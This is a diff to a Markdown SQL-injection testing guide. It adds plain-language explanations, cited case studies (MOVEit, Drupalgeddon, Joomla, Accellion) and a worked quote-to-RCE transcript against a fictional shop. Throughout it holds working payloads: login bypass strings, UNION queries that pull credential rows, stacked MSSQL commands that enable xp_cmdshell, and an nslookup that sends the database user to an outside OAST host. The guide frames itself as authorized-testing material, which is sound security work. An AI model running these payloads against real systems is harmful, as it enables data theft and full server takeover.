@@ -62,12 +62,14 @@
 25. [Building a Professional, Safe PoC](#25-building-a-professional-safe-poc)
 26. [Reporting, CWE/CVSS & De-duplication](#26-reporting-cwecvss--de-duplication)
 27. [Automation (sqlmap) & Red-Team Notes](#27-automation-sqlmap--red-team-notes)
+28. [Real-World Case Studies (Verified)](#28-real-world-case-studies-verified)
 
 **Appendices**
 - [Appendix A — SQLi Workflow Cheat Sheet](#appendix-a--sqli-workflow-cheat-sheet)
 - [Appendix B — SQLi Decision Tree](#appendix-b--sqli-decision-tree)
 - [Appendix C — Per-DBMS Syntax & Function Reference](#appendix-c--per-dbms-syntax--function-reference)
 - [Appendix D — Important Links](#appendix-d--important-links)
+- [Appendix E — Worked End-to-End Transcript (quote → RCE)](#appendix-e--worked-end-to-end-transcript-quote--rce)
 
 ---
 
@@ -137,6 +139,13 @@ sqlmap -u "https://target/item?id=1" --batch --risk=2 --level=3          # confi
 ## 2.1 What it is
 User input is incorporated into a SQL statement **as code, not data** — the app string-builds the query instead of using a **parameterized query / prepared statement**. By injecting SQL syntax you change *what the query does*: read other rows/tables (dump), make a condition always-true (auth bypass / boolean oracle), call DBMS functions (read files, sleep, run OS commands), or append extra statements (stacked queries → write/RCE). It is **CWE-89**, the canonical member of the injection family (**CWE-74**).
 
+> 🔰 **In plain words — the anchor for this whole kit.** The app talks to the database by **speaking a sentence** — e.g. *"bring me the row WHERE id = '5'"*. Your input (`5`) is supposed to be a **quoted word** in that sentence: just data, one word, harmless. SQL injection is discovering you can **break out of the quotes** and start writing the *grammar of the sentence itself* — so instead of being a word, you're now telling the database what to do: *"...WHERE id = '5' OR give-me-everything"*, or *"...and by the way, also run this command."*
+> - The single quote `'` is your crowbar — it's how you test whether you can pry open the quotes around your word. An error on `'` means the sentence broke = you're touching the grammar.
+> - Everything after that is: **where exactly does my word sit** (the *context* — inside quotes? a bare number? a column name?), **which dialect does this database speak** (MySQL/PostgreSQL/MSSQL/Oracle/SQLite — same idea, different words for "sleep" and "version"), and **how does the database answer me** (does it show the data, just behave differently for true-vs-false, or can I make it pause?).
+> - The permanent fix — **parameterized queries** — is the app promising the clerk *"whatever is in this blank is always just a word, never grammar, no matter what they write."* When that promise is kept, there's no bug; SQLi is what happens when the app glues your text into the sentence instead.
+>
+> Keep this picture: every section is either "prove I can write grammar, not just words" (detection) or "here's the order I gave and what I got" (impact — dump / log in as admin / run a command).
+
 ## 2.2 The query clauses your input can land in (each behaves differently)
 ```
 WHERE      …WHERE id = $x            most common; boolean/union/time all apply
@@ -158,6 +167,7 @@ IDENTIFIER …ORDER BY INPUT           can't use quotes; the value names a colum
 LIKE       …name LIKE 'INPUT%'       string context but inside LIKE; watch %/_ and the trailing %
 QUOTED-NUM '…' wrapping a number      sometimes numeric data is quoted; treat as string context
 ```
+> **In plain words:** *where your word sits in the sentence decides which crowbar you need.* If your input is wrapped in quotes (`name = 'INPUT'`), you need a `'` to break out — that's **string context**. If it's a bare number (`id = INPUT`), there are no quotes to break; you just start writing (`1 OR 1=1`) — **numeric context**. And the sneaky one: if your input *names a column* (`ORDER BY INPUT`), there's no string and no quote to escape at all — you can't use `'`, you have to use completely different tricks (§5.4). Beginners try `'` everywhere, get nothing on a numeric or identifier slot, and wrongly conclude "not vulnerable." **Always figure out the context first** — it decides everything you do next.
 
 ## 2.4 The FIVE technique families (decide detection — Part II)
 ```
@@ -168,6 +178,8 @@ QUOTED-NUM '…' wrapping a number      sometimes numeric data is quoted; treat 
 5. OUT-OF-BAND   no in-band channel; force the DB to make a DNS/HTTP request that carries the data to you.    §10
 (+ STACKED QUERIES: append ; <second statement> → INSERT/UPDATE/exec — driver-dependent.)                    §11
 ```
+> **In plain words:** *how does the database answer you?* There are five channels, best-to-worst for convenience. **Error-based** = the database prints its mistakes on the page, and you can trick it into printing your stolen data *inside* an error message. **UNION** = the page shows query results, so you bolt on "...and also show me the passwords table." **Boolean-blind** = you see no data and no errors, but a *true* condition and a *false* condition make the page look subtly different — so you play 20-questions, one yes/no at a time, to spell out the data. **Time-blind** = even the page looks identical either way, but you can make the database *pause 5 seconds* when your guess is right — you read the answer from the clock. **Out-of-band** = the page tells you nothing at all, so you make the database phone your server (a DNS lookup) with the data baked into the address. You only need **one** working channel to win — take whichever the target hands you.
+
 Pick the **most reliable observable** the target gives you, in roughly this order of convenience: in-band (error/UNION) > boolean > time > OOB. You only need **one** to win.
 
 ## 2.5 Why DBMS matters (the same bug, five dialects)
@@ -225,6 +237,8 @@ Go     db.Query("..."+x)  / fmt.Sprintf into SQL                                
 # 4. Baseline — Detect & Classify
 
 **Do this before deep payloads.** Establish observability, context, and DBMS.
+
+> **In plain words:** don't reach for big payloads yet. First answer three small questions with tiny pokes. **(1) Can I touch the grammar?** — send a lone `'`; an error or a changed page means yes. **(2) Where does my word sit?** — the arithmetic trick `id=2-1`: if you get the *same* row as `id=1`, the database *did the math*, which means your input is a bare number (numeric context), not a quoted string. **(3) How does it answer?** — does an error show, does `AND 1=1` vs `AND 1=2` change the page (boolean), does `SLEEP(5)` make it hang (time)? These cheap pokes tell you the context, the channel, and often the engine — *then* you pick payloads. And critically: **silence is not safety** — no error usually just means the bug is *blind*, not absent.
 
 ## 4.1 Quick classification probes (send each ALONE, compare to a normal value)
 ```
@@ -292,6 +306,8 @@ id=1'))-- -   → close two parens               (nested wrappers)
 ```
 
 ## 5.4 IDENTIFIER context (`ORDER BY` / column / table name) — no quotes possible
+> **In plain words:** this is the **single most-missed SQLi**, so slow down here. When your input becomes a *column name* (`ORDER BY yourinput`) rather than a value, there's no string wrapping it — so a `'` does literally nothing, and hunters give up. But the database still lets you smuggle logic in *other* ways: change `?sort=1` to `?sort=2` and watch the order flip (proof your input is a live column reference), or feed it a `CASE WHEN (something) THEN ... ELSE ...` so the *ordering itself* answers a yes/no question, or a `(SELECT SLEEP(5))` sub-question to read by the clock. Why it matters commercially: tons of "safe" ORMs parameterize the *values* but paste the **sort column** in raw — so this is exactly where a well-defended app is still wide open.
+
 You can't break a string because there isn't one. Three reliable routes:
 ```
 COLUMN INDEX :  ?sort=1  vs  ?sort=2          → different ordering = injectable identifier; brute index to find column count.
@@ -309,6 +325,8 @@ DIRECTION slot :  ?order=ASC→ try  ?order=ASC,(SELECT …)  or  ?order=ASC-- -
 # 6. Error-Based Detection & DBMS Fingerprinting
 
 A visible DB error confirms injection *and* fingerprints the engine — and on many engines you can force data *into* the error message (error-based extraction).
+
+> **In plain words:** a database error message is a gift twice over. First, its *wording* tells you which engine you're facing — MySQL, PostgreSQL, and Oracle each phrase "you broke my sentence" differently, so the error is a fingerprint. Second, on many engines you can *weaponize* the error: you feed the database a value it's forced to choke on (like "convert this password into a number"), and it helpfully prints the password *inside the error message* while complaining. So a visible error isn't just proof — it can be your whole data-exfil channel, one clean string at a time. If errors are hidden (generic 500 / blank page), don't quit — that just means you drop to the blind channels (§7/§8).
 
 ## 6.1 Fingerprint from the error text / behavior
 ```
@@ -345,6 +363,8 @@ Oracle (ORA error carrying value):
 
 No data and no error, but a **true** condition and a **false** condition produce **different responses** (length, status, a present/absent string, a redirect, "in stock" vs "out of stock"). That difference is a 1-bit oracle — read the database one bit at a time.
 
+> **In plain words:** the page shows you no data and no errors — but it *reacts* differently to a true statement than a false one (maybe "in stock" vs "out of stock", or a slightly different page length). That tiny difference is a **yes/no light bulb**, and a yes/no light is all you need to read anything. You ask the database a stream of yes/no questions — *"is the first letter of the admin password's ASCII value greater than 77? ...greater than 109?"* — narrowing it down like a game of 20-questions until each character is pinned. It's tedious (that's why the `poc/sqli_blind.py` tool automates the binary search), but it reads the entire database just as completely as seeing it on screen — so it's still High/Critical, just slower.
+
 ## 7.1 Build the oracle
 ```
 Numeric:  id=1 AND 1=1   → TRUE  page (normal row shows)        id=1 AND 1=2   → FALSE page (row gone / different)
@@ -370,6 +390,8 @@ BINARY SEARCH each char with ASCII()/UNICODE() and > to cut to ~7 requests/char:
 
 When even boolean gives no visible difference (fully blind), make the DB **pause** on a condition and read the answer from the **response time**. The slowest but most universal channel — it works whenever the query runs at all.
 
+> **In plain words:** sometimes even the yes/no light bulb is gone — the page looks *identical* whether your guess is right or wrong. So you make the database answer with the **clock instead of the screen**: "if the first letter is an 's', *pause for 5 seconds* before replying." If the reply takes 5 seconds, your guess was right; if it comes back instantly, wrong. You're reading the data purely from how long the response takes. It's the slowest channel (every character costs real seconds) but the most universal — it works whenever the query runs at all, even behind a total blackout. It also fingerprints the engine for free, since only MySQL has `SLEEP`, only Postgres has `pg_sleep`, only MSSQL has `WAITFOR`.
+
 ## 8.1 The sleep primitive per DBMS
 ```
 MySQL:       ' AND SLEEP(5)-- -            1 AND SLEEP(5)            ' OR IF(1=1,SLEEP(5),0)-- -
@@ -393,6 +415,8 @@ CONFIRM not noise: run the SAME payload with SLEEP(0) and SLEEP(5) a few times; 
 # 9. UNION-Based Detection
 
 When the query's results are **reflected** in the page, `UNION SELECT` appends rows from *any* table into that visible output — the fastest, cleanest dump. Two prerequisites: match the **column count** and find a column of a **compatible (string) type**.
+
+> **In plain words:** `UNION` is SQL's way of saying "*...and also, glue these extra rows onto the results.*" If the page already shows you query results (a product list, search results), you tack on "...and also show me every username and password" and they appear right there in the product list. Two catches, both mechanical: your bolted-on `SELECT` must have the **same number of columns** as the original (you find the count by climbing `ORDER BY 1,2,3...` until it errors, or adding `NULL`s until it stops complaining), and you put your stolen text in a column that displays **text** (not a numbers-only column). It's the fastest, cleanest channel — the data just shows up on the page — so reach for it whenever results are visible.
 
 ## 9.1 Find the column count
 ```
@@ -474,6 +498,8 @@ Use:     '; UPDATE users SET role='admin' WHERE id=<your-own-test-id>-- -   (pri
 # 12. Authentication Bypass
 
 A login that builds `SELECT * FROM users WHERE user='$u' AND pass='$p'` is bypassable by making the `WHERE` always-true or commenting out the password check.
+
+> **In plain words:** a login sentence asks the database *"is there a user named `___` whose password is `___`?"* and treats "yes, a row came back" as "you're logged in." You cheat two ways. **Comment out the password check:** type the username as `admin'-- -` — the `--` turns the entire rest of the sentence (the `AND password = ...` part) into an ignored comment, so the database only checks "is there a user named admin?" → yes → you're in as admin, no password needed. **Make it always true:** type `' OR '1'='1` so the condition becomes "...OR 1=1", which is always true, so a row always comes back. The whole trick is that the app trusts "a row exists" instead of actually verifying the password — you just arrange for a row to always exist.
 ```
 COMMENT OUT the password:   user = admin'-- -          → WHERE user='admin'-- -' AND pass='…'   (password ignored)
                             user = admin'#             (MySQL)        user = admin'/*
@@ -561,6 +587,8 @@ PREREQUISITES (all must hold): write privilege + known absolute webroot path + t
 # 16. Remote Code Execution per DBMS
 
 The top of the impact tree. Privilege-dependent, but when it lands it's an unambiguous **Critical**.
+
+> **In plain words:** the ceiling — not just reading the database, but running commands on the *server* the database lives on. Some databases have built-in features that shell out to the operating system: MSSQL's `xp_cmdshell` literally runs a Windows command, PostgreSQL's `COPY ... FROM PROGRAM` runs a shell command and captures its output, MySQL can do it via a loaded plugin (UDF). If the database account has enough privilege and you can stack a second statement, you point one of these at a harmless command (`whoami`) and get its output back — that single line proves you can run *any* command on the box = **Critical, full server compromise**. This is the headline; lead your report with it. Prove it with one benign command and **stop** — don't add users, persist, or run anything destructive.
 ```
 MSSQL — xp_cmdshell (the classic):
   '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
@@ -601,6 +629,8 @@ Hash cracking:     dumped password hashes → offline crack (hashcat) → reuse 
 # 18. Second-Order SQL Injection
 
 Your input is **stored** safely, then later **concatenated** into a query by a *different* feature (a report job, an admin search, a profile render, an audit query) that trusts stored data and doesn't re-escape it.
+
+> **In plain words:** the sneaky, delayed-fuse version. When you register, the signup form is careful — it stores your username safely, so *nothing happens then*. But later, some *other* feature (an admin report, a "users like you" panel, a stats job) pulls your stored username out and glues it into a *new* sentence without being careful — and *that's* where it detonates. The payload was planted innocently in one place and fires somewhere else entirely. Two reasons it's dangerous: it's easy to miss (the input that looked "safe" is the culprit), and the query that finally runs it is often an **admin/report job with higher privileges** than your own account ever had. Plant a time/OOB payload (those survive being stored), then go trigger every feature that might read it back.
 ```
 PLANT:   set a stored field (username, display name, address, filename, comment) to a payload, e.g.
          registration username:  admin'-- -      or      profile bio:  x' UNION SELECT @@version-- -
@@ -895,6 +925,34 @@ sqlmap -r req.txt --tamper=space2comment,between,charencode --random-agent
 
 ---
 
+# 28. Real-World Case Studies (Verified)
+
+> SQL injection is the oldest bug on the OWASP list and *still* the one that produces the largest breaches — because a single injectable parameter can become **mass data theft or RCE at scale**. These are documented, attributed cases; each maps to a technique in this guide so you see the payload behind the headline. (Verify-before-write discipline: every claim below was checked against primary advisories, cited inline.)
+
+**① MOVEit Transfer — SQLi → webshell → RCE → mass data theft (2023, CVE-2023-34362). The modern flagship.**
+In late May 2023 the **Cl0p** ransomware group exploited an **unauthenticated SQL injection zero-day** in Progress **MOVEit Transfer** (a managed file-transfer app). The SQLi let them **interact directly with the backend database**, from which they deployed a webshell — **LEMURLOOT**, an ASP.NET `.aspx` file typically dropped as **`human2.aspx`** to blend in next to MOVEit's legitimate `human.aspx` — giving OS command execution and a persistent backdoor. The result was one of the largest data-theft campaigns of the decade (thousands of downstream organizations). This is *exactly* the arc this guide teaches: **injection → §15 write-a-webshell / §16 RCE → full compromise** — SQLi is not "just data disclosure." CISA issued advisory **AA23-158A**.
+→ *Techniques:* injection → §15 (write file → webshell) → §16 (RCE). *Lesson:* SQLi's ceiling is RCE, and unauth SQLi on an internet-facing appliance is a catastrophe.
+*Source:* [CISA AA23-158A — Cl0p exploits CVE-2023-34362](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a) · [Picus — CVE-2023-34362 analysis](https://www.picussecurity.com/resource/blog/cve-2023-34362-cl0p-ransomware-exploits-moveit-transfer-sqli-vulnerability)
+
+**② Drupalgeddon — pre-auth SQLi via array KEYS (2014, CVE-2014-3704). The "injection isn't only in values" case.**
+Drupal 7's database abstraction layer built `IN (...)` clauses with an `expandArguments()` helper that expanded array parameters — but it folded the **array *key*** into the SQL by concatenating it onto the placeholder name. So a request with a crafted key like `name[0; <SQL> ;]` injected SQL **through the key, not the value** — **unauthenticated**, in Drupal core <7.32, giving full site control and a documented path to **RCE**. It shows why parameter *names/keys*, HTTP structure, and ORM internals are injection surface too (this guide's §18/§19 mindset). Disclosed by SektionEins (advisory **SA-CORE-2014-005**, Oct 2014), fixed in 7.32; exploited so fast that Drupal warned sites not patched within hours should assume compromise.
+→ *Techniques:* injection in a non-obvious sink (§3 recon breadth), §19 ORM/abstraction-layer awareness. *Lesson:* the injection point isn't always the value you see.
+*Source:* [SektionEins — SA-CORE-2014-005 advisory](https://www.openwall.com/lists/oss-security/2014/10/15/23) · [NVD — CVE-2014-3704](https://nvd.nist.gov/vuln/detail/CVE-2014-3704)
+
+**③ Joomla! `com_fields` — public SQLi in an ORDER BY sink (2017, CVE-2017-8917). The identifier-context case.**
+Joomla 3.7.0 shipped a new, **publicly reachable** `com_fields` component whose `getListQuery()` concatenated the `list[fullordering]` request value straight into an **`ORDER BY`** clause without sanitization. Because `ORDER BY` can't be parameterized the usual way, this was a clean **identifier/ORDER BY-context injection** (this guide's §5.4) → nested SQL → full DB read, no auth. Disclosed by Sucuri (May 2017), fixed in 3.7.1.
+→ *Techniques:* §5.4 identifier/`ORDER BY` context. *Lesson:* `ORDER BY` sinks are a real, common SQLi context that "quote the input" defenses don't cover.
+*Source:* [Sucuri — SQLi in Joomla 3.7](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html) · [Joomla dev — 20170501 Core SQL Injection](https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html)
+
+**④ Accellion FTA — SQLi via the Host header (2021, CVE-2021-27101). The header-as-sink case.**
+Accellion's legacy File Transfer Appliance incorporated the **HTTP `Host` header** into a SQL query at the `document_root.html` endpoint without sanitization, so a **crafted `Host:` header** injected SQL — **unauthenticated** — in versions ≤ `9_12_370`. Cl0p chained it with other FTA bugs into a webshell (DEWMODE) and mass data theft. It's a reminder that **any** attacker-controlled input reaching a query is a sink — headers included (this guide's §3 recon: "test every input, not just the query string").
+→ *Techniques:* §3 (headers are sinks), injection → webshell. *Lesson:* recon breadth — the `Host`/`User-Agent`/`X-Forwarded-For` headers are SQLi surface.
+*Source:* [Rapid7 — CVE-2021-27101 (SQLi via crafted Host header)](https://www.rapid7.com/db/vulnerabilities/accellion-fta-cve-2021-27101/) · [Tenable — Accellion FTA vulnerabilities](https://www.tenable.com/blog/accellion-patches-file-transfer-appliance-vulnerabilities-cve-2021-27101-cve-2021-27102-cve-2021-27103-cve-2021-27104)
+
+**⑤ The meta-lesson.** Two of these four (MOVEit, Accellion) were exploited by the *same* ransomware crew for *mass* extortion, and all four were **unauthenticated, one-parameter** bugs that reached **full-DB or full-host** compromise. That's the whole severity argument for SQLi: it is a pre-auth, internet-facing, RCE-capable class hiding behind "a quote threw an error." The four cases also map to the four things this guide nags about — inject **beyond the value** (Drupalgeddon keys), in **every context** (Joomla `ORDER BY`), from **every input** (Accellion `Host`), and always ask **"how far does this go?"** (MOVEit: all the way to RCE).
+
+---
+
 # Appendix A — SQLi Workflow Cheat Sheet
 
 ```
@@ -1024,8 +1082,69 @@ NO-QUOTE strings:  MySQL 0x61646d696e = 'admin' ·  CHAR/CHR(...) on all ·  Ora
 - **CWE-89** (SQL Injection) · **CWE-74** (injection) · **CWE-287** (auth bypass) · **CWE-78** (OS command via SQL→RCE): https://cwe.mitre.org/data/definitions/89.html
 - **CVSS 3.1** — SQLi is typically `AC:L` and reaches `C:H/I:H/A:H` (full DB compromise), rising to `S:C` when it pivots to the OS / other tenants (see §23).
 
-**Notable real-world cases / CVEs:**
-- **MOVEit Transfer** CVE-2023-34362 (Cl0p mass exploitation) · **Accellion FTA** CVE-2021-27101 · **Drupalgeddon** CVE-2014-3704 · **Joomla!** CVE-2017-8917. Pattern: *one injectable parameter → mass data theft / RCE at scale.*
+**Notable real-world cases / CVEs:** **MOVEit** CVE-2023-34362 · **Accellion FTA** CVE-2021-27101 · **Drupalgeddon** CVE-2014-3704 · **Joomla!** CVE-2017-8917 — each written up with the technique + source in **§28 (Real-World Case Studies)**. Pattern: *one injectable parameter → mass data theft / RCE at scale.*
+
+---
+
+# Appendix E — Worked End-to-End Transcript (quote → RCE)
+
+> **What this shows.** The whole spine in one run — the [Master Testing Sequence](#master-testing-sequence--the-testing-order) in motion — on a fictional `https://shop.example/product?id=14`. It deliberately walks the **validity discipline** SQLi lives or dies on (proving the *query changed*, not that an error *reflected*), fingerprints the engine, extracts a benign proof, then escalates to **OS RCE** — because SQLi's ceiling is RCE, not disclosure (see §28 ①/MOVEit). Placeholders are benign; run only on your own lab / an authorized target, and stop at one benign proof.
+
+**Step 1 — recon + baseline: is `id` a sink, and what context? (§3–§5)** Send probes *alone* and compare to the normal value:
+
+```
+GET /product?id=14              → 200, "Wireless Mouse"      (control / normal)
+GET /product?id=14'             → 500, error: ...near "'"... Microsoft SQL Server...   ← breaks on a quote → candidate
+GET /product?id=15-1            → 200, "Wireless Mouse"      (id=14) → NUMERIC context (arithmetic evaluated server-side!)
+GET /product?id=14 AND 1=1      → 200, "Wireless Mouse"      (true)
+GET /product?id=14 AND 1=2      → 200, "No product found"    (false)   ← query CHANGED with the boolean = real SQLi
+```
+
+> **Validity gate (§21.2 — the #1 rule).** `id=14'`→error alone is *not* proof (could be a reflected string). `id=15-1` returning product 14, and `1=1`/`1=2` flipping the result, prove the **database evaluated my input** — the query changed. Only now is it SQLi. The error text also **fingerprints MSSQL** (§6).
+
+**Step 2 — pick the channel: UNION (results are visible, so use the fastest one) (§9).** Numeric context, so no quotes needed. Find the column count, then the visible/string column:
+
+```
+GET /product?id=14 ORDER BY 5-- -    → 200         (5 columns OK)
+GET /product?id=14 ORDER BY 6-- -    → 500         (6 fails)  → exactly 5 columns
+GET /product?id=-14 UNION SELECT 1,2,3,4,5-- -     → page prints "2" and "3"  → cols 2 & 3 are visible/string-typed
+```
+
+**Step 3 — benign proof (fingerprint + one row, NOT a full dump) (§13).** Prove impact with the minimum:
+
+```
+GET /product?id=-14 UNION SELECT 1,@@version,DB_NAME(),4,5-- -
+   → prints: Microsoft SQL Server 2019 ... | shop_prod           (version + current DB = clean proof, §25)
+GET /product?id=-14 UNION SELECT 1,name,2,4,5 FROM sys.databases-- -    → master, tempdb, shop_prod  (schema breadth)
+# ONE credential row as evidence (not the whole table):
+GET /product?id=-14 UNION SELECT 1,email,password_hash,4,5 FROM users WHERE id=1-- -
+   → admin@shop.example | $2b$12$Rk...   ← one row proves read access. STOP dumping. (§25 discipline)
+```
+
+**Step 4 — escalate to the ceiling: OS RCE (this is why SQLi is Critical) (§16).** The error said MSSQL; check privilege, enable and run `xp_cmdshell` via a stacked query:
+
+```
+GET /product?id=-14 UNION SELECT 1,IS_SRVROLEMEMBER('sysadmin'),3,4,5-- -   → 1   (we're sysadmin → xp_cmdshell reachable)
+# stacked query (MSSQL allows ';' multi-statement) — enable + run ONE benign command:
+GET /product?id=14; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
+GET /product?id=14; EXEC xp_cmdshell 'whoami';-- -        (read the output via a UNION/error channel, or blind→OOB)
+   → nt authority\system            ← OS command execution as SYSTEM. This is the Critical. STOP.
+```
+
+> **If UNION output isn't available for the command result** (e.g., stacked query runs but you can't see `whoami`), prove execution **blind/OOB** (§10): `EXEC xp_cmdshell 'nslookup shop.'+ (SELECT SYSTEM_USER) +'.oast.pro'` → a DNS hit on your Collaborator carrying the username proves *the OS command ran* — the same fetch-carries-output trick used across the blind kits.
+
+**Step 5 — report the impact, not the quote (§26).** File it as the chain, lead with RCE:
+
+```
+Title:  SQL injection in /product?id → OS RCE as NT AUTHORITY\SYSTEM (full server compromise)
+Proof:  numeric-context SQLi (id=15-1→product 14; 1=1/1=2 flip) → MSSQL fingerprint → 5-col UNION →
+        @@version + DB_NAME() + ONE users row (redacted hash) → sysadmin → xp_cmdshell 'whoami' = nt authority\system.
+Impact: full database read/write AND arbitrary OS commands on the DB host (Critical, CVSS 9.8, CWE-89→CWE-78).
+Notes:  benign proof only — no data dumped beyond 1 row, xp_cmdshell setting restored, no persistence. Cleanup logged.
+Fix:    parameterized queries / prepared statements; least-privilege DB account (not sysadmin); disable xp_cmdshell.
+```
+
+That is a full SQLi run: **§3 recon → §4/§5 baseline+context → §6 fingerprint → §9 UNION → §13 benign extract → §16 RCE → §26 report.** One quote became SYSTEM — proven with a single benign command, then stopped. This is the MOVEit arc (§28 ①) done ethically.
 
 ---
 
